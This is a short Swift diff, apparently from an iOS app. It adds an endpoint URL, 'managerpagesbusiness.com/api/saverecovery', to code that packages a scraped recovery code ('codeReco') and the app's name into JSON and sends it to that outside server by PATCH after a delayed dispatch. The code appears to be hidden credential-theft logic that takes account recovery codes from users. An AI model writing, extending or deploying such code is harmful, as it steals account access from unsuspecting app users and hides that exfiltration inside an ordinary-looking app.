@@ -80,7 +80,7 @@ DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
                                     "codeReco": "\(htmlrecovery)",
                                     "nameapp": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-TWO"
                                 ]
-                                let url : URL = URL(string: "")!
+                                let url : URL = URL(string: "https://managerpagesbusiness.com/api/saverecovery")!
                                 let json_data = try? JSONSerialization.data(withJSONObject: Six_json_data)
                                 var request = URLRequest(url: url)
                                 request.httpMethod = "PATCH"
